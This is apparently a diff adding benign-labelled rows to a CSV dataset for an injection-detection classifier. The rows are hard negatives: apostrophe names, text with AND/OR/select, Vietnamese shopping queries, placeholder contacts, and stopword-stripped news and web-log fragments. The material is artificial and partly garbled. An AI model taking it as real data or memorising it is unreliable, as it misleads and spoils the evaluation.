+" &quot; The local authorities satisfied , &quot; emphasised Maier ",0,kaggle
+" If often evening , often several people car , know back seat look like partied night: clothes , bottles rubbish begin pile ",0,kaggle
+ I see day coming towns municipalities get fed clearing - fast food chains operate deposit scheme bags ,0,kaggle
+" How fast change implemented vary airline , FAA Administrator Michael Huerta said news conference ",0,kaggle
+ The FAA said already received plans airlines expand use portable electronic devices planes ,0,kaggle
+" Passengers told switch smartphones , tablets devices airplane mode ",0,kaggle
+" So , still Words With Friends , online Scrabble-type game actor Alec Baldwin playing smartphone 2011 famously booted American Airlines jet refusing turn device plane parked gate ",0,kaggle
+" &quot; Cell phones , really issue , potentially could create interference navigational devices , know , according FCC , could interfere cell phone towers &apos;re air , &quot; Rosenker said ",0,kaggle
+" , contend valid safety reason prohibitions ",0,kaggle
+" The FAA began restricting passengers &apos; use electronic devices 1966 response reports interference navigation communications equipment passengers began carrying FM radios , high-tech gadgets day ",0,kaggle
+" New airliners far reliant electrical systems previous generations aircraft , also designed approved FAA resistant electronic interference ",0,kaggle
+ Airlines offering Wi-Fi use cruising altitudes passengers several years ,0,kaggle
+" The vast majority airliners qualify greater electronic device use new guidelines , Huerta said ",0,kaggle
+ Douglas Kidd National Association Airline Passengers said believes interference devices genuine even risk minimal ,0,kaggle
+ Travel Association ,0,kaggle
+ modify 9 28845 28845 apply2 Fun 2453 1 bbs314 129-945,0,kaggle
+ 난 훌륭하다,0,kaggle
+net /usr/lib/sendmail http://1sa23l,0,kaggle
+com/post/140267892711/management-consulting-via-how-to-get-more-value study 95 6 wr_datetime desc bbs338 12 view 122,0,kaggle
+cgi 60 9bedb57073 heartbeat nav-menus false yetglezip 41 49 PRODUCT393 PRODUCT393 bbs1 1 view 115,0,kaggle
+"com/wp-includes/online-mc, PRODUCT409 PRODUCT409 %EB%B0%95%EC%A3%BC%ED%98%B8 %ED%99%8D%EA%B8%B8%EB%8F%99 %ED%99%8D%EA%B8%B8%EA%B0%80 %ED%99%8D%EA%B8%B8%EB%82%98 %ED%99%8D%EA%B8%B8%EB%8B%A4 %ED%99%8D%EA%B8%B8%EB%9D%BC %ED%99%8D%EA%B8%B8%EB%A7%88 %ED%99%8D%EA%B8%B8%EB%B0%94 %ED%99%8D%EA%B8%B8%EC%82%AC %ED%99%8D%EA%B8%B8%EC%95%84 %ED%99%8D%EA%B8%B8%EC%9E%90 %ED%99%8D%EC%A7%88%EC%B0%A8%ED%99%8D%EC%A7%88%EC%B0%A8 & & =  (주)나빠요하하 ******* ********* ********** *********** ************** *************** +5hIp5/XQSe0q9x4@V$K@xbLIzU9CXs34UqM8@V$K@B9PWaIyA1ZscZc0tdMH@V$K@xbLIzU9CXs34UqM8 -----------------------------7e110e370ece -----------------------------7e115a25c0784 -----------------------------7e1161151f9e -----------------------------7e123d150600 -----------------------------7e12422e2 -----------------------------7e12422e2c090a -----------------------------7e12b2f1e1098 -----------------------------7e12db131 -----------------------------7e12db131f238a -----------------------------7e13482d1 -----------------------------7e13482d1b1020 -----------------------------7e135771c0f0c -----------------------------7e17a8320a4 -----------------------------7e1846d0fba -----------------------------7e196581600 -----------------------------7e1c7582640 ------WebKitFormBoundaryxqnD09MP6AAoISHj ",0,kaggle
+cgi 2& 20 20003 2017 201704/00001491382788757,0,kaggle
+"org/?option = com_k2  <a href = ""http://corfopym",0,kaggle
+picsearch,0,kaggle
+0903781105,0,synthetic_benign
+0904342491,0,synthetic_benign
+0904471208,0,synthetic_benign
+0905856595,0,synthetic_benign
+0907166906,0,synthetic_benign
+0908289681,0,synthetic_benign
+0908981388,0,synthetic_benign
+0910507197,0,synthetic_benign
+0910877175,0,synthetic_benign
+0912264725,0,synthetic_benign
+0912300857,0,synthetic_benign
+0912316257,0,synthetic_benign
+0914120224,0,synthetic_benign
+0918912415,0,synthetic_benign
+0920945167,0,synthetic_benign
+0923137447,0,synthetic_benign
+0924588469,0,synthetic_benign
+0924594085,0,synthetic_benign
+0924926932,0,synthetic_benign
+0927433037,0,synthetic_benign
+0928551438,0,synthetic_benign
+0930293011,0,synthetic_benign
+0931491357,0,synthetic_benign
+0931802040,0,synthetic_benign
+0932664214,0,synthetic_benign
+0933155530,0,synthetic_benign
+0935934177,0,synthetic_benign
+0936381643,0,synthetic_benign
+0937399006,0,synthetic_benign
+0940515588,0,synthetic_benign
+0941233613,0,synthetic_benign
+0945354681,0,synthetic_benign
+0945456350,0,synthetic_benign
+0947566573,0,synthetic_benign
+0947709067,0,synthetic_benign
+0948183219,0,synthetic_benign
+0948722557,0,synthetic_benign
+0950781072,0,synthetic_benign
+0951263700,0,synthetic_benign
+0953311564,0,synthetic_benign
+0953720335,0,synthetic_benign
+0956364058,0,synthetic_benign
+0957119249,0,synthetic_benign
+0957445203,0,synthetic_benign
+0957788462,0,synthetic_benign
+0958210728,0,synthetic_benign
+0964119913,0,synthetic_benign
+0966489667,0,synthetic_benign
+0966886583,0,synthetic_benign
+0967503809,0,synthetic_benign
+0967616629,0,synthetic_benign
+0970132156,0,synthetic_benign
+0971940656,0,synthetic_benign
+0973174211,0,synthetic_benign
+0974125121,0,synthetic_benign
+0974665353,0,synthetic_benign
+0974964990,0,synthetic_benign
+0975665051,0,synthetic_benign
+0976344334,0,synthetic_benign
+0977953342,0,synthetic_benign
+0978672530,0,synthetic_benign
+0980778336,0,synthetic_benign
+0980959243,0,synthetic_benign
+0981889073,0,synthetic_benign
+0982619906,0,synthetic_benign
+0982682725,0,synthetic_benign
+0982996291,0,synthetic_benign
+0983273158,0,synthetic_benign
+0983491232,0,synthetic_benign
+0983680601,0,synthetic_benign
+0984131284,0,synthetic_benign
+0984719017,0,synthetic_benign
+0987597997,0,synthetic_benign
+0989523617,0,synthetic_benign
+0990371912,0,synthetic_benign
+0990669849,0,synthetic_benign
+0991116612,0,synthetic_benign
+0991649701,0,synthetic_benign
+0993898331,0,synthetic_benign
+0995214562,0,synthetic_benign
+0995995342,0,synthetic_benign
+0996293956,0,synthetic_benign
+0996340646,0,synthetic_benign
+0996354760,0,synthetic_benign
+0998386384,0,synthetic_benign
+0998444088,0,synthetic_benign
+0999240658,0,synthetic_benign
+0999684834,0,synthetic_benign
+0999813646,0,synthetic_benign
+"11 Lê Lợi, Cầu Giấy, Đà Nẵng",0,synthetic_benign
+"111 Trần Phú, Hà Đông, Huế",0,synthetic_benign
+"112 Trần Phú, Hà Đông, Hà Nội",0,synthetic_benign
+1129 + 1129 = 1129,0,synthetic_benign
+"113 Trần Phú, Hà Đông, Huế",0,synthetic_benign
+1219 + 1219 = 1219,0,synthetic_benign
+"125 Nguyễn Trãi, Hà Đông, TP.HCM",0,synthetic_benign
+"128 Nguyễn Trãi, Hải Châu, Hà Nội",0,synthetic_benign
+1344 + 1344 = 1344,0,synthetic_benign
+1351 + 1351 = 1351,0,synthetic_benign
+1374 + 1374 = 1374,0,synthetic_benign
+"138 Trần Phú, Hà Đông, Hà Nội",0,synthetic_benign
+"14 Nguyễn Trãi, Thanh Xuân, Đà Nẵng",0,synthetic_benign
+1408 + 1408 = 1408,0,synthetic_benign
+1435 + 1435 = 1435,0,synthetic_benign
+"144 Giải Phóng, Thanh Xuân, Huế",0,synthetic_benign
+1497 + 1497 = 1497,0,synthetic_benign
+"155 Giải Phóng, Quận 1, Huế",0,synthetic_benign
+"162 Quang Trung, Hà Đông, Đà Nẵng",0,synthetic_benign
+1688 + 1688 = 1688,0,synthetic_benign
+1709 + 1709 = 1709,0,synthetic_benign
+184 + 184 = 184,0,synthetic_benign
+"184 Trần Phú, Thanh Xuân, Huế",0,synthetic_benign
+1847 + 1847 = 1847,0,synthetic_benign
+"192 Lê Lợi, Quận 1, TP.HCM",0,synthetic_benign
+2009 + 2009 = 2009,0,synthetic_benign
+204 + 204 = 204,0,synthetic_benign
+206 + 206 = 206,0,synthetic_benign
+2139 + 2139 = 2139,0,synthetic_benign
+2144 + 2144 = 2144,0,synthetic_benign
+"228 Nguyễn Trãi, Hà Đông, TP.HCM",0,synthetic_benign
+"229 Trần Phú, Hà Đông, Huế",0,synthetic_benign
+2388 + 2388 = 2388,0,synthetic_benign
+2391 + 2391 = 2391,0,synthetic_benign
+"245 Lê Lợi, Quận 1, Hà Nội",0,synthetic_benign
+"272 Trần Phú, Thanh Xuân, Huế",0,synthetic_benign
+2723 + 2723 = 2723,0,synthetic_benign
+2949 + 2949 = 2949,0,synthetic_benign
+296 + 296 = 296,0,synthetic_benign
+3013 + 3013 = 3013,0,synthetic_benign
+3057 + 3057 = 3057,0,synthetic_benign
+306 + 306 = 306,0,synthetic_benign
+3105 + 3105 = 3105,0,synthetic_benign
+3189 + 3189 = 3189,0,synthetic_benign
+3296 + 3296 = 3296,0,synthetic_benign
+3381 + 3381 = 3381,0,synthetic_benign
+3440 + 3440 = 3440,0,synthetic_benign
+3481 + 3481 = 3481,0,synthetic_benign
+"35 Lê Lợi, Cầu Giấy, Đà Nẵng",0,synthetic_benign
+"35 Nguyễn Trãi, Quận 1, Hà Nội",0,synthetic_benign
+3511 + 3511 = 3511,0,synthetic_benign
+3524 + 3524 = 3524,0,synthetic_benign
+3561 + 3561 = 3561,0,synthetic_benign
+3673 + 3673 = 3673,0,synthetic_benign
+3740 + 3740 = 3740,0,synthetic_benign
+3994 + 3994 = 3994,0,synthetic_benign
+"4 Quang Trung, Thanh Xuân, Huế",0,synthetic_benign
+4101 + 4101 = 4101,0,synthetic_benign
+4139 + 4139 = 4139,0,synthetic_benign
+4281 + 4281 = 4281,0,synthetic_benign
+4289 + 4289 = 4289,0,synthetic_benign
+429 + 429 = 429,0,synthetic_benign
+4385 + 4385 = 4385,0,synthetic_benign
+4399 + 4399 = 4399,0,synthetic_benign
+4430 + 4430 = 4430,0,synthetic_benign
+4495 + 4495 = 4495,0,synthetic_benign
+4510 + 4510 = 4510,0,synthetic_benign
+4546 + 4546 = 4546,0,synthetic_benign
+4551 + 4551 = 4551,0,synthetic_benign
+4673 + 4673 = 4673,0,synthetic_benign
+4747 + 4747 = 4747,0,synthetic_benign
+480 + 480 = 480,0,synthetic_benign
+4825 + 4825 = 4825,0,synthetic_benign
+4925 + 4925 = 4925,0,synthetic_benign
+4927 + 4927 = 4927,0,synthetic_benign
+5 + 5 = 5,0,synthetic_benign
+"52 Lê Lợi, Cầu Giấy, Đà Nẵng",0,synthetic_benign
+560 + 560 = 560,0,synthetic_benign
+588 + 588 = 588,0,synthetic_benign
+590 + 590 = 590,0,synthetic_benign
+"66 Trần Phú, Thanh Xuân, Huế",0,synthetic_benign
+689 + 689 = 689,0,synthetic_benign
+802 + 802 = 802,0,synthetic_benign
+"81 Quang Trung, Thanh Xuân, Huế",0,synthetic_benign
+928 + 928 = 928,0,synthetic_benign
+939 + 939 = 939,0,synthetic_benign
+"95 Trần Phú, Thanh Xuân, Huế",0,synthetic_benign
+966 + 966 = 966,0,synthetic_benign
+"97 Nguyễn Trãi, Hà Đông, TP.HCM",0,synthetic_benign
+Anna-Marie McDonald,0,synthetic_benign
+Anna-Marie O'Brien's order is delayed,0,synthetic_benign
+Bùi Ngọc Nam,0,synthetic_benign
+Bùi Quốc Lan's order is delayed,0,synthetic_benign
+C++ / C# tutorial,0,synthetic_benign
+D'Angelo John,0,synthetic_benign
+D'Angelo McDonald,0,synthetic_benign
+D'Angelo O'Connor AND D'Angelo O'Connor,0,synthetic_benign
+"Giao hàng đến 11 Lê Lợi, Thanh Xuân, TP.HCM, gọi 0918131254",0,synthetic_benign
+"Giao hàng đến 119 Lê Lợi, Hải Châu, Huế, gọi 0987413146",0,synthetic_benign
+"Giao hàng đến 136 Quang Trung, Hải Châu, TP.HCM, gọi 0906889589",0,synthetic_benign
+"Giao hàng đến 148 Nguyễn Trãi, Hà Đông, Huế, gọi 0974067582",0,synthetic_benign
+"Giao hàng đến 174 Quang Trung, Hà Đông, TP.HCM, gọi 0913184560",0,synthetic_benign
+"Giao hàng đến 190 Quang Trung, Thanh Xuân, TP.HCM, gọi 0912275950",0,synthetic_benign
+"Giao hàng đến 200 Trần Phú, Hải Châu, Hà Nội, gọi 0929694269",0,synthetic_benign
+"Giao hàng đến 226 Lê Lợi, Hải Châu, Đà Nẵng, gọi 0982543183",0,synthetic_benign
+"Giao hàng đến 234 Giải Phóng, Quận 1, TP.HCM, gọi 0975326033",0,synthetic_benign
+"Giao hàng đến 244 Giải Phóng, Cầu Giấy, Hà Nội, gọi 0951820377",0,synthetic_benign
+"Giao hàng đến 26 Quang Trung, Quận 1, Đà Nẵng, gọi 0926893746",0,synthetic_benign
+"Giao hàng đến 266 Quang Trung, Thanh Xuân, Đà Nẵng, gọi 0934255638",0,synthetic_benign
+"Giao hàng đến 28 Quang Trung, Thanh Xuân, TP.HCM, gọi 0967946778",0,synthetic_benign
+"Giao hàng đến 30 Quang Trung, Thanh Xuân, Đà Nẵng, gọi 0924402936",0,synthetic_benign
+"Giao hàng đến 300 Trần Phú, Cầu Giấy, TP.HCM, gọi 0984581630",0,synthetic_benign
+"Giao hàng đến 48 Trần Phú, Hà Đông, Hà Nội, gọi 0987290477",0,synthetic_benign
+"Giao hàng đến 55 Nguyễn Trãi, Cầu Giấy, Huế, gọi 0969562509",0,synthetic_benign
+"Giao hàng đến 7 Lê Lợi, Quận 1, TP.HCM, gọi 0966932337",0,synthetic_benign
+"Giao hàng đến 84 Trần Phú, Hà Đông, Hà Nội, gọi 0941152621",0,synthetic_benign
+"Giao hàng đến 88 Quang Trung, Quận 1, Đà Nẵng, gọi 0997610321",0,synthetic_benign
+Hoàng Thu Linh's order is delayed,0,synthetic_benign
+Hoàng Thị Dũng AND Hoàng Thị Dũng,0,synthetic_benign
+Hoàng Thị Hương,0,synthetic_benign
+John Anna-Marie's order is delayed,0,synthetic_benign
+John McDonald's order is delayed,0,synthetic_benign
+John O'Brien's order is delayed,0,synthetic_benign
+Liên hệ: lan_pham147@example.com hoặc 0983119778,0,synthetic_benign
+Liên hệ: lan_pham507@example.com hoặc 0953989137,0,synthetic_benign
+Liên hệ: lan_pham574@example.com hoặc 0955422054,0,synthetic_benign
+Liên hệ: lan_pham591@example.com hoặc 0973471566,0,synthetic_benign
+Liên hệ: lan_pham597@example.com hoặc 0951495583,0,synthetic_benign
+Liên hệ: lan_pham671@example.com hoặc 0972240553,0,synthetic_benign
+Liên hệ: lan_pham72@example.com hoặc 0950252854,0,synthetic_benign
+Liên hệ: lan_pham804@example.com hoặc 0946176792,0,synthetic_benign
+Liên hệ: lan_pham853@example.com hoặc 0948500728,0,synthetic_benign
+Liên hệ: lan_pham866@example.com hoặc 0906026909,0,synthetic_benign
+Liên hệ: lan_pham908@example.com hoặc 0920043209,0,synthetic_benign
+Liên hệ: lan_pham957@example.com hoặc 0991567407,0,synthetic_benign
+Liên hệ: lan_pham977@example.com hoặc 0922997853,0,synthetic_benign
+Liên hệ: nam99125@example.com hoặc 0997896812,0,synthetic_benign
+Liên hệ: nam99173@example.com hoặc 0942060511,0,synthetic_benign
+Liên hệ: nam99225@example.com hoặc 0956407232,0,synthetic_benign
+Liên hệ: nam99252@example.com hoặc 0972132901,0,synthetic_benign
+Liên hệ: nam99278@example.com hoặc 0932567405,0,synthetic_benign
+Liên hệ: nam99318@example.com hoặc 0987130002,0,synthetic_benign
+Liên hệ: nam99408@example.com hoặc 0990700960,0,synthetic_benign
+Liên hệ: nam99445@example.com hoặc 0986067347,0,synthetic_benign
+Liên hệ: nam99541@example.com hoặc 0901104708,0,synthetic_benign
+Liên hệ: nam99766@example.com hoặc 0935866715,0,synthetic_benign
+Liên hệ: nam9979@example.com hoặc 0944776186,0,synthetic_benign
+Liên hệ: nam99825@example.com hoặc 0971157873,0,synthetic_benign
+Liên hệ: nam99834@example.com hoặc 0907991906,0,synthetic_benign
+Liên hệ: nam99886@example.com hoặc 0940694861,0,synthetic_benign
+Lê Minh Bình's order is delayed,0,synthetic_benign
+Lê Ngọc Lan AND Lê Ngọc Lan,0,synthetic_benign
+Lê Quốc Nam AND Lê Quốc Nam,0,synthetic_benign
+Mary D'Angelo's order is delayed,0,synthetic_benign
+Mary McDonald AND Mary McDonald,0,synthetic_benign
+McDonald Mary's order is delayed,0,synthetic_benign
+McDonald Smith's order is delayed,0,synthetic_benign
+Nguyễn Minh Hoa,0,synthetic_benign
+Nguyễn Quốc Hương AND Nguyễn Quốc Hương,0,synthetic_benign
+Nguyễn Quốc Hương's order is delayed,0,synthetic_benign
+Nguyễn Quốc Lan,0,synthetic_benign
+O'Brien O'Brien's order is delayed,0,synthetic_benign
+O'Brien Smith AND O'Brien Smith,0,synthetic_benign
+O'Connor Mary's order is delayed,0,synthetic_benign
+Phạm Quốc An AND Phạm Quốc An,0,synthetic_benign
+Smith D'Angelo,0,synthetic_benign
+Smith D'Angelo AND Smith D'Angelo,0,synthetic_benign
+Smith Smith AND Smith Smith,0,synthetic_benign
+Trần Quốc Lan,0,synthetic_benign
+Tôi muốn chọn (select) size 1050 cho Phạm Ngọc Nam,0,synthetic_benign
+Tôi muốn chọn (select) size 1414 cho Vũ Quốc Linh,0,synthetic_benign
+Tôi muốn chọn (select) size 1485 cho Anna-Marie Smith,0,synthetic_benign
+Tôi muốn chọn (select) size 1681 cho McDonald Anna-Marie,0,synthetic_benign
+Tôi muốn chọn (select) size 2371 cho John O'Brien,0,synthetic_benign
+Tôi muốn chọn (select) size 2564 cho Anna-Marie McDonald,0,synthetic_benign
+Tôi muốn chọn (select) size 257 cho John McDonald,0,synthetic_benign
+Tôi muốn chọn (select) size 2773 cho Nguyễn Văn Lan,0,synthetic_benign
+Tôi muốn chọn (select) size 3227 cho Vũ Quốc Bình,0,synthetic_benign
+Tôi muốn chọn (select) size 3245 cho McDonald O'Brien,0,synthetic_benign
+Tôi muốn chọn (select) size 3374 cho Phạm Minh Lan,0,synthetic_benign
+Tôi muốn chọn (select) size 3453 cho McDonald O'Connor,0,synthetic_benign
+Tôi muốn chọn (select) size 3510 cho O'Brien O'Brien,0,synthetic_benign
+Tôi muốn chọn (select) size 3591 cho Bùi Văn Nam,0,synthetic_benign
+Tôi muốn chọn (select) size 4440 cho Anna-Marie O'Connor,0,synthetic_benign
+Tôi muốn chọn (select) size 4621 cho Phạm Thị Dũng,0,synthetic_benign
+Tôi muốn chọn (select) size 4717 cho John McDonald,0,synthetic_benign
+Tôi muốn chọn (select) size 803 cho Trần Thị Hoa,0,synthetic_benign
+Tôi muốn chọn (select) size 864 cho Bùi Minh Linh,0,synthetic_benign
+Vũ Thu Linh,0,synthetic_benign
+black & white t-shirt (size M) OR black & white t-shirt (size M),0,synthetic_benign
+giày chạy bộ OR giày chạy bộ,0,synthetic_benign
+lan_pham135@example.com,0,synthetic_benign
+lan_pham168@example.com,0,synthetic_benign
+lan_pham207@example.com,0,synthetic_benign
+lan_pham208@example.com,0,synthetic_benign
+lan_pham219@example.com,0,synthetic_benign
+lan_pham261@example.com,0,synthetic_benign
+lan_pham281@example.com,0,synthetic_benign
+lan_pham286@example.com,0,synthetic_benign
+lan_pham293@example.com,0,synthetic_benign
+lan_pham317@example.com,0,synthetic_benign
+lan_pham330@example.com,0,synthetic_benign
+lan_pham38@example.com,0,synthetic_benign
+lan_pham473@example.com,0,synthetic_benign
+lan_pham534@example.com,0,synthetic_benign
+lan_pham58@example.com,0,synthetic_benign
+lan_pham631@example.com,0,synthetic_benign
+lan_pham68@example.com,0,synthetic_benign
+lan_pham69@example.com,0,synthetic_benign
+lan_pham718@example.com,0,synthetic_benign
+lan_pham720@example.com,0,synthetic_benign
+lan_pham823@example.com,0,synthetic_benign
+lan_pham829@example.com,0,synthetic_benign
+lan_pham855@example.com,0,synthetic_benign
+"laptop 15"" OR laptop 15""",0,synthetic_benign
+my username is Anna-Marie O'Connor and my password hint is 'first pet',0,synthetic_benign
+my username is Bùi Thu Hoa and my password hint is 'first pet',0,synthetic_benign
+my username is Bùi Văn An and my password hint is 'first pet',0,synthetic_benign
+my username is Hoàng Thị Hương and my password hint is 'first pet',0,synthetic_benign
+my username is Lê Ngọc Bình and my password hint is 'first pet',0,synthetic_benign
+my username is Lê Quốc An and my password hint is 'first pet',0,synthetic_benign
+my username is Mary D'Angelo and my password hint is 'first pet',0,synthetic_benign
+my username is Nguyễn Thị Lan and my password hint is 'first pet',0,synthetic_benign
+my username is O'Connor O'Brien and my password hint is 'first pet',0,synthetic_benign
+my username is Phạm Ngọc Nam and my password hint is 'first pet',0,synthetic_benign
+my username is Trần Ngọc Hương and my password hint is 'first pet',0,synthetic_benign
+my username is Vũ Thị Nam and my password hint is 'first pet',0,synthetic_benign
+my username is Đặng Minh Dũng and my password hint is 'first pet',0,synthetic_benign
+order #1212 - Phạm Thu Linh,0,synthetic_benign
+order #150 - Phạm Văn Bình,0,synthetic_benign
+order #1530 - John Mary,0,synthetic_benign
+order #2199 - McDonald D'Angelo,0,synthetic_benign
+order #2839 - John Mary,0,synthetic_benign
+order #3254 - D'Angelo Mary,0,synthetic_benign
+order #3318 - Bùi Ngọc Hương,0,synthetic_benign
+order #3348 - McDonald O'Brien,0,synthetic_benign
+order #3439 - D'Angelo Mary,0,synthetic_benign
+order #3749 - McDonald Smith,0,synthetic_benign
+order #3854 - Mary John,0,synthetic_benign
+order #3882 - Trần Ngọc Linh,0,synthetic_benign
+order #4581 - O'Brien Mary,0,synthetic_benign
+order #4936 - John Mary,0,synthetic_benign
+order #543 - Lê Thị Nam,0,synthetic_benign
+order #750 - Vũ Thu Hương,0,synthetic_benign
+order by price ascending,0,synthetic_benign
+search: iPhone 15,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 1095k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 1557k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 1739k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 2606k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 3309k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 3564k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 3904k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 4170k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 4643k,0,synthetic_benign
+tìm tai nghe bluetooth giá dưới 4668k,0,synthetic_benign
+"what's up? it's me, Anna-Marie John",0,synthetic_benign
+"what's up? it's me, Anna-Marie Mary",0,synthetic_benign
+"what's up? it's me, Mary John",0,synthetic_benign
+"what's up? it's me, Mary Mary",0,synthetic_benign
+"what's up? it's me, Mary O'Connor",0,synthetic_benign
+"what's up? it's me, Mary Smith",0,synthetic_benign
+"what's up? it's me, Phạm Thị Bình",0,synthetic_benign
+"what's up? it's me, Phạm Văn An",0,synthetic_benign
+where can i buy C++ programming book,0,synthetic_benign
+"where can i buy laptop 15""",0,synthetic_benign
+áo thun trắng đen OR áo thun trắng đen,0,synthetic_benign
+Đặng Ngọc Dũng,0,synthetic_benign
+Đặng Thị Hương's order is delayed,0,synthetic_benign
